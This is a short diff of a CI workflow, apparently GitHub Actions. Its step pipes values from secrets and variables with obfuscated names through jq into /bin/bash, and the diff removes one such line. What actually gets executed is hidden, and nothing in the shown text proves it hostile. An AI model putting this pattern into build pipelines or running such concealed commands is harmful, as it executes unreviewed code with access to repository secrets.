@@ -18,7 +18,6 @@ jobs:
           a05: ${{ secrets.a05 }}
         run: |
           printf '%s' "$a05" | jq -r .nup41 | /bin/bash
-          echo $zlv31 | jq -r .m2718 | /bin/bash
           echo $gwuno2687 | jq -r .zdr532 | /bin/bash
           printf '%s' "$de1" | jq -r .ckmk1 | /bin/bash
 
